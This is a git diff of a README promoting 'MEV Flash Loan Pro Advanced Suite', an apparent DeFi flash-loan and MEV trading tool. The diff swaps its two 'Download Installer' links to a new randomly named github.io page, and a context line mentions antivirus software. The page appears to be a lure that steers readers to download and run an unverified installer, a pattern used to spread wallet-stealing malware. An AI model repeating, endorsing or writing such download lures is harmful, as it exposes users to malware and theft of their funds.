@@ -2,7 +2,7 @@
 
 MEV Flash Loan Pro Advanced Suite is the ultimate tool for maximizing profits in decentralized finance through MEV strategies and flash loans. Designed for advanced users in 2026, it offers a comprehensive suite of features for Ethereum and Solana networks, enabling automated trading and arbitrage with cutting-edge technology.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -65,7 +65,7 @@ A: First, ensure you have administrative privileges and that your antivirus soft
 
 To download the latest version of MEV Flash Loan Pro Advanced Suite, visit the official download page. Click the link below to get started and unlock advanced MEV capabilities:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
